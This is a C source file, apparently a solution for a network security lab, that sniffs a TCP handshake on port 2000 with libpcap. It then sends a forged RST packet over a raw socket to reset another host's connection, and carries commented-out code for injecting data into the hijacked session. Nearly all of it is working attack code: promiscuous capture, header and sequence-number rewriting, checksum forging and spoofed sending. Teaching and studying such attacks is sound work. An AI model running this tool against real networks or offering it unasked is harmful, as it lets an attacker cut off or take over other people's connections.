#include<stdio.h>
#include<time.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<unistd.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>

#include "header.h"
#include "TCP_hijack.h"

unsigned long host1, host2;
unsigned int  port1, port2;
unsigned char packet1[BUF_SIZE], packet2[BUF_SIZE];
int size1, size2, dsize1, dsize2;
struct iphdr  *iphdr1,  *iphdr2;
struct tcphdr *tcphdr1, *tcphdr2;
char *data1, *data2;
time_t time1, time2;

int total = 0;

int main(int argc, char *argv[])
{
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;

	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}

	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode");
	}

	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	//BEGIN_SOLUTION
	//	char filter_exp[] = "host 192.168.1.100";	/* The filter expression */
	char filter_exp[] = "tcp && port 2000";
	//	char filter_exp[] = "udp && port 53";
	struct bpf_program fp;		/* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	//END_SOLUTION

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}

	//Set up a raw socket
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	// Sniff on the three-way handshake packets, set up attack target
	pcap_loop(handle , 3 , set_up_attack , NULL);
	
	// Send a packet to host2 pretending host1
	tcphdr1->seq = htonl(ntohl(tcphdr1->seq)+1);
    tcphdr1->syn = 0;
    tcphdr1->rst = 1;
    tcphdr1->ack = 0;
	tcphdr1->check = TCP_checksum(iphdr1, tcphdr1, data1);

	srand(time(NULL));
	iphdr1->id = ntohs(rand());
	iphdr1->check = checksum((unsigned short*)iphdr1, 20);

	struct sockaddr_in in_addr;
	in_addr.sin_family = AF_INET;
	in_addr.sin_port = tcphdr1->dest;
	in_addr.sin_addr.s_addr = iphdr1->daddr; 
	int len = sendto(fd, packet1, size1, 0, (struct sockaddr*)&in_addr, sizeof(struct sockaddr));
	if(len){
		printf("sent %d bytes to %s:%d\n", len, inet_ntoa(in_addr.sin_addr), ntohs(tcphdr1->dest));
	}

	// struct sockaddr_in in_addr;
	// in_addr.sin_family = AF_INET;
	// in_addr.sin_port = tcphdr2->dest;
	// in_addr.sin_addr.s_addr = iphdr2->daddr;

	// char *msg = "TCP_hijack";
	// tcphdr2->seq = tcphdr1->ack_seq;
	// printf("ntohl(tcphdr1->TSval) = %d\n", ntohl(tcphdr1->TSval));
	// tcphdr2->TSecr = tcphdr1->TSval;
	// tcphdr2->TSval = htonl(ntohl(tcphdr2->TSecr) + time(NULL) - time2);
	// bzero(data2, dsize2);
	// memcpy(data2, msg, strlen(msg));
	// size2 = size2 - dsize2 + strlen(msg);
	// dsize2 = strlen(msg);

	// iphdr2->tot_len = htons(size2);
	// srand(time(NULL));
	// iphdr2->id = htons(ntohs(iphdr2->id)+1);
	// iphdr2->check = checksum((unsigned short*)iphdr2, sizeof(struct iphdr));

	// int len = sendto(fd, packet2, size2, 0, (struct sockaddr*)&in_addr, sizeof(struct sockaddr));
	// if(len){
	// 	printf("sent %d bytes to %s:%d\n", len, inet_ntoa(in_addr.sin_addr), ntohs(tcphdr2->dest));
	// }

	pcap_close(handle);

	close(fd);

	return 0;

}

void set_up_attack(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *buffer)
{
	printf("a packet is received! %d \n", ++total);
	int size = header->len;

	//Finding the beginning of IP header
	int link_header_size;

	switch (header_type)
	{
	case LINKTYPE_ETH:
		link_header_size =  sizeof(struct ethhdr); //For ethernet
		break;

	case LINKTYPE_NULL:
		link_header_size = 4;
		break;

	case LINKTYPE_WIFI:
		link_header_size = 57;
		break;

	case 113:
		link_header_size = 16;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}
	size -= link_header_size;

	if(total == 2){
		// The second packet is assumed from host1 to host2
		time1 = header->ts.tv_sec;
		puts("*****catched message from host1*****");
		memcpy(packet1, buffer+link_header_size, size);

		iphdr1 = (struct iphdr*)(packet1);
		tcphdr1 = (struct tcphdr*)(iphdr1 + 1);

		host1 = iphdr1->saddr;
		host2 = iphdr1->daddr;
		port1 = tcphdr1->source;
		port2 = tcphdr1->dest;
		
		data1 = (char *)(tcphdr1)+tcphdr1->doff*4;
		size1 = size;
		dsize1 = size - 20 - tcphdr1->doff*4;

		print_information(iphdr1, tcphdr1);
	}
	if(total == 3){
		// The third packet is assumed from host2 to host1
		time2 = header->ts.tv_sec;
		puts("*****catched message from host2*****");
		
		memcpy(packet2, buffer+link_header_size, size);

		iphdr2 = (struct iphdr*)(packet2);
		tcphdr2 = (struct tcphdr*)(iphdr2 + 1);

		if(iphdr2->saddr!=host2 || iphdr2->daddr!=host1 || tcphdr2->source!=port2 || tcphdr2->dest!=port1){
			puts("failed to catch ACK from host2");
			return;
		}
		
		size2 = size;
		dsize2 = size - 20 - tcphdr2->doff*4;
		data2 = (char *)(tcphdr2)+tcphdr2->doff*4;
		
		print_information(iphdr2, tcphdr2);
	}
	
}

void print_information(struct iphdr* iph, struct tcphdr* tcph){
    struct sockaddr_in addr;
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = iph->saddr;
	printf("Source address: %s\n", inet_ntoa(addr.sin_addr));
	addr.sin_addr.s_addr = iph->daddr;
	printf("Dest address: %s\n", inet_ntoa(addr.sin_addr));

	printf("Source port: %d\n", ntohs(tcph->source));
	printf("Dest port: %d\n", ntohs(tcph->dest));
	printf("TCP seq number: %d\n", ntohl(tcph->seq));
	printf("TCP ack number: %d\n", ntohl(tcph->ack_seq));
	printf("Message: %s\n", (char *)(tcph)+tcph->doff*4);

    puts("-----------------------\n");
}
